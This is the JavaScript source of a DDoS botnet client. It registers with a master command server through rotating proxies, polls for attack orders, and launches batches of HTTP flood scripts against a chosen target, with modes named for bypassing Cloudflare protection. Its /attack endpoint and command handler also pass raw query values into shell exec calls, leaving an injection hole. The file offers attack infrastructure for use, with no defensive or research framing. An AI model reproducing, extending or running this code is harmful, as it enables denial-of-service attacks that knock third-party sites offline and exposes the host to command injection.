const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

// Auto-install missing dependencies function
async function installDependencies() {
  const requiredPackages = [
    'express',
    'axios',
    'socks',
    'random-useragent',
    'cookie-parser',
    'express-rate-limit',
    'https-proxy-agent',
    'socks-proxy-agent',
    'colors'
  ];

  console.log('\n🔍 Checking dependencies...');
  
  const missingPackages = [];
  
  // Check which packages are missing
  for (const pkg of requiredPackages) {
    try {
      require.resolve(pkg);
      console.log(`✅ ${pkg} - installed`);
    } catch (e) {
      console.log(`❌ ${pkg} - missing`);
      missingPackages.push(pkg);
    }
  }

  // Install missing packages
  if (missingPackages.length > 0) {
    console.log('\n📦 Installing missing packages:', missingPackages.join(', '));
    console.log('⏳ This may take a few moments...\n');

    return new Promise((resolve, reject) => {
      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], {
        stdio: 'inherit',
        shell: true
      });

      install.on('close', (code) => {
        if (code === 0) {
          console.log('\n✅ All dependencies installed successfully!\n');
          resolve();
        } else {
          console.error('\n❌ Failed to install dependencies');
          reject(new Error('Installation failed'));
        }
      });
    });
  } else {
    console.log('\n✅ All dependencies already installed!\n');
  }
}

// Main bot code wrapped in async function
async function startBot() {
  // Install dependencies first
  try {
    await installDependencies();
  } catch (error) {
    console.error('Failed to install dependencies:', error);
    process.exit(1);
  }

  // Now require all the packages after they're installed
  const express = require('express');
  const axios = require('axios');
  const { SocksProxyAgent } = require('socks-proxy-agent');
  const { HttpsProxyAgent } = require('https-proxy-agent');
  const randomUseragent = require('random-useragent');
  const cookieParser = require('cookie-parser');
  const colors = require('colors');

  const app = express();
  const port = process.env.PORT || process.env.SERVER_PORT || 5552;

  // Master server URL - your Render deployment
  const MASTER_SERVER = process.env.MASTER_SERVER || 'http://localhost:5553';
  let myBotUrl = '';
  let registrationAttempts = 0;
  const MAX_REGISTRATION_ATTEMPTS = 5;
  let activeProcesses = []; // Track active attack processes
  let isBlocked = false; // Track if bot is blocked by server
  let proxyList = []; // Store proxies
  let currentProxyIndex = 0;

  // Middleware
  app.use(express.json());
  app.use(cookieParser());

  // Load proxies from file
  function loadProxies() {
    try {
      if (fs.existsSync('proxy.txt')) {
        const data = fs.readFileSync('proxy.txt', 'utf8');
        proxyList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#'));
        console.log(`[PROXY] Loaded ${proxyList.length} proxies`.cyan);
      } else {
        console.log('[PROXY] No proxy.txt found, running without proxies'.yellow);
        // Create sample proxy file
        fs.writeFileSync('proxy.txt', '# Add your proxies here\n# Format: ip:port or socks5://ip:port\n# Example:\n# 123.45.67.89:1080\n# socks5://user:pass@host:port\n');
      }
    } catch (error) {
      console.log('[PROXY] Error loading proxies:'.red, error.message);
    }
  }

  // Get next proxy
  function getNextProxy() {
    if (proxyList.length === 0) return null;
    const proxy = proxyList[currentProxyIndex];
    currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
    return proxy;
  }

  // Create agent with proxy
  function createProxyAgent(targetUrl) {
    const proxy = getNextProxy();
    if (!proxy) return null;

    try {
      if (proxy.startsWith('socks4://') || proxy.startsWith('socks5://')) {
        return new SocksProxyAgent(proxy);
      } else {
        // Assume HTTP/HTTPS proxy
        return new HttpsProxyAgent(`http://${proxy}`);
      }
    } catch (error) {
      console.log(`[PROXY] Error creating agent: ${error.message}`.red);
      return null;
    }
  }

  // Get random user agent
  function getRandomUserAgent() {
    return randomUseragent.getRandom();
  }

  async function fetchData() {
    try {
      const response = await fetch('https://httpbin.org/get');
      const data = await response.json();
      myBotUrl = `http://${data.origin}:${port}`;
      
      console.log('\n' + '='.repeat(40).cyan);
      console.log('🤖 Auto-Register Bot Client Started!'.cyan.bold);
      console.log('='.repeat(40).cyan);
      console.log(`📍 Local:    http://localhost:${port}`.green);
      console.log(`📍 Network:  ${myBotUrl}`.green);
      console.log(`🔗 Master:   ${MASTER_SERVER}`.yellow);
      console.log(`🔄 Status:   Auto-registration ENABLED`.magenta);
      console.log(`💓 Heartbeat: Every 30 seconds`.blue);
      console.log(`🕸️  Proxies:   ${proxyList.length} loaded`.cyan);
      console.log('='.repeat(40).cyan + '\n');
      
      return data;
    } catch (error) {
      myBotUrl = `http://localhost:${port}`;
      console.log(`🤖 Bot running at ${myBotUrl}`.green);
      console.log(`🔗 Master Server: ${MASTER_SERVER}`.yellow);
    }
  }

  // Auto-register with master server
  async function autoRegister() {
    if (isBlocked) {
      console.log(`\n❌ [BLOCKED] This bot has been permanently blocked by the server`.red.bold);
      console.log(`📢 Bot URL: ${myBotUrl}`.yellow);
      console.log(`📢 Contact server admin to unblock`.yellow);
      process.exit(0);
    }

    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
      console.log(`⚠️  Max registration attempts reached. Will retry in 60s...`.yellow);
      setTimeout(() => {
        registrationAttempts = 0;
        autoRegister();
      }, 60000);
      return;
    }

    try {
      console.log(`📡 Auto-registering with master server... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`.cyan);
      
      const config = {};
      const agent = createProxyAgent(MASTER_SERVER);
      if (agent) {
        config.httpsAgent = agent;
        config.proxy = false;
      }

      const response = await axios.post(`${MASTER_SERVER}/register`, {
        url: myBotUrl
      }, {
        timeout: 10000,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': getRandomUserAgent()
        },
        ...config
      });

      if (response.data.approved) {
        console.log(`✅ [SUCCESS] Auto-approved by master server!`.green.bold);
        console.log(`🤖 Bot registered at: ${myBotUrl}`.cyan);
        console.log(`⚡ Ready to receive attack commands!\n`.green);
        
        // Fast command polling - check every 3 seconds
        setInterval(() => {
          checkForCommands();
        }, 3000);
        
        // Send heartbeat every 30 seconds
        setInterval(() => {
          sendHeartbeat();
        }, 30000);
        
        return;
      }
    } catch (error) {
      // Check if bot is blocked (403 status)
      if (error.response && error.response.status === 403) {
        console.log(`\n❌ [BLOCKED] This bot has been permanently blocked!`.red.bold);
        console.log(`Bot URL: ${myBotUrl}`.yellow);
        console.log(`Server: ${MASTER_SERVER}`.yellow);
        isBlocked = true;
        process.exit(0);
        return;
      }

      registrationAttempts++;
      console.error(`❌ Registration failed: ${error.message}`.red);
      console.log(`🔄 Retrying in 5 seconds...`.yellow);
      
      setTimeout(() => {
        autoRegister();
      }, 5000);
    }
  }

  // Send heartbeat to master
  async function sendHeartbeat() {
    try {
      const config = {};
      const agent = createProxyAgent(MASTER_SERVER);
      if (agent) {
        config.httpsAgent = agent;
        config.proxy = false;
      }

      await axios.get(`${MASTER_SERVER}/ping`, { 
        timeout: 5000,
        headers: { 'User-Agent': getRandomUserAgent() },
        ...config
      });
      console.log(`💓 [HEARTBEAT] Sent to master | Status: ONLINE`.green);
    } catch (error) {
      console.log(`💔 [HEARTBEAT] Failed | Status: OFFLINE`.red);
      console.log(`🔄 Re-registering with master...`.yellow);
      registrationAttempts = 0;
      autoRegister();
    }
  }

  // Poll for commands from master
  async function checkForCommands() {
    try {
      const config = {};
      const agent = createProxyAgent(MASTER_SERVER);
      if (agent) {
        config.httpsAgent = agent;
        config.proxy = false;
      }

      const response = await axios.get(`${MASTER_SERVER}/get-command`, {
        params: { botUrl: myBotUrl },
        timeout: 5000,
        headers: { 'User-Agent': getRandomUserAgent() },
        ...config
      });

      if (response.data.hasCommand) {
        const command = response.data.command;
        
        if (command.action === 'stop') {
          console.log(`\n🛑 [STOP-RECEIVED] Stopping all attacks`.yellow.bold);
          stopAllAttacks();
        } else if (command.action === 'attack') {
          const { target, time, methods } = command;
          console.log(`\n⚡ [COMMAND-RECEIVED] ${methods} -> ${target} for ${time}s`.magenta.bold);
          executeAttack(target, time, methods);
        }
      }
    } catch (error) {
      // Silently fail - will retry on next poll
    }
  }

  // Stop all running attacks
  function stopAllAttacks() {
    console.log(`🔪 Killing ${activeProcesses.length} active processes`.red);
    
    activeProcesses.forEach(proc => {
      try {
        process.kill(-proc.pid);
        console.log(`✅ Killed process ${proc.pid}`.green);
      } catch (error) {
        console.error(`❌ Failed to kill process ${proc.pid}: ${error.message}`.red);
      }
    });
    
    activeProcesses = [];
    console.log(`✅ All attacks stopped\n`.green);
  }

  // Execute attack methods
  function executeAttack(target, time, methods) {
    const execWithLog = (cmd) => {
      console.log(`⚡ [EXEC] ${cmd}`.cyan);
      const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
        if (error) {
          console.error(`❌ [ERROR] ${error.message}`.red);
          return;
        }
        if (stdout) console.log(`📤 [OUTPUT] ${stdout}`.gray);
        if (stderr) console.error(`📥 [STDERR] ${stderr}`.yellow);
      });
      
      activeProcesses.push(proc);
      
      setTimeout(() => {
        const index = activeProcesses.indexOf(proc);
        if (index > -1) {
          activeProcesses.splice(index, 1);
        }
      }, parseInt(time) * 1000 + 5000);
    };

    // Check if method files exist
    const methodChecks = {
      'CF-BYPASS': 'methods/cf-bypass.js',
      'MODERN-FLOOD': 'methods/modern-flood.js',
      'HTTP-SICARIO': 'methods/REX-COSTUM.js',
      'RAW-HTTP': 'methods/h2-nust',
      'R9': 'methods/high-dstat.js',
      'PRIV-TOR': 'methods/w-flood1.js',
      'HOLD-PANEL': 'methods/http-panel.js',
      'R1': 'methods/vhold.js',
      'UAM': 'methods/uam.js',
      'W.I.L': 'methods/wil.js'
    };

    if (methodChecks[methods] && !fs.existsSync(methodChecks[methods])) {
      console.log(`⚠️  Warning: ${methodChecks[methods]} not found, but executing anyway`.yellow);
    }

    if (methods === 'CF-BYPASS') {
      console.log('[✓] Executing CF-BYPASS'.green);
      execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
    }
    else if (methods === 'MODERN-FLOOD') {
      console.log('[✓] Executing MODERN-FLOOD'.green);
      execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
    }
    else if (methods === 'HTTP-SICARIO') {
      console.log('[✓] Executing HTTP-SICARIO'.green);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
    } 
    else if (methods === 'RAW-HTTP') {
      console.log('[✓] Executing RAW-HTTP'.green);
      execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
    } 
    else if (methods === 'R9') {
      console.log('[✓] Executing R9'.green);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
    } 
    else if (methods === 'PRIV-TOR') {
      console.log('[✓] Executing PRIV-TOR'.green);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
    } 
    else if (methods === 'HOLD-PANEL') {
      console.log('[✓] Executing HOLD-PANEL'.green);
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
    } 
    else if (methods === 'R1') {
      console.log('[✓] Executing R1'.green);
      execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
    }
    else if (methods === 'UAM') {
      console.log('[✓] Executing UAM'.green);
      execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
    }
    else if (methods === 'W.I.L') {
      console.log('[✓] Executing W.I.L'.green);
      execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
    }
    else {
      console.log(`❌ Unknown method: ${methods}`.red);
    }
  }

  // Health check endpoint
  app.get('/health', (req, res) => {
    res.json({ 
      status: 'online', 
      timestamp: Date.now(),
      master: MASTER_SERVER,
      bot: 'ready',
      uptime: process.uptime(),
      activeAttacks: activeProcesses.length,
      proxies: proxyList.length,
      userAgent: getRandomUserAgent(),
      cookies: req.cookies
    });
  });

  // Ping endpoint
  app.get('/ping', (req, res) => {
    res.cookie('lastPing', Date.now(), { maxAge: 900000, httpOnly: true });
    res.json({ 
      alive: true,
      uptime: process.uptime(),
      timestamp: Date.now(),
      status: 'online',
      userAgent: req.headers['user-agent']
    });
  });

  // Get proxy list endpoint
  app.get('/proxies', (req, res) => {
    res.json({ 
      total: proxyList.length,
      proxies: proxyList.slice(0, 10) // Return first 10 for security
    });
  });

  // Receive attack commands from master
  app.get('/attack', (req, res) => {
    const { target, time, methods } = req.query;

    if (!target || !time || !methods) {
      return res.status(400).json({
        error: 'Missing parameters',
        required: ['target', 'time', 'methods']
      });
    }

    console.log(`\n📥 [RECEIVED] ${methods} -> ${target} for ${time}s`.magenta.bold);

    res.status(200).json({
      message: 'Attack command received. Executing methods now.',
      target,
      time,
      methods,
      bot: 'executing',
      timestamp: Date.now()
    });

    executeAttack(target, time, methods);
  });

  // Start server
  app.listen(port, async () => {
    // Load proxies
    loadProxies();
    
    await fetchData();
    
    console.log('⏳ Starting auto-registration in 3 seconds...\n'.cyan);
    setTimeout(() => {
      autoRegister();
    }, 3000);
  });
}

// Start everything
startBot().catch(error => {
  console.error('Failed to start bot:', error);
  process.exit(1);
});
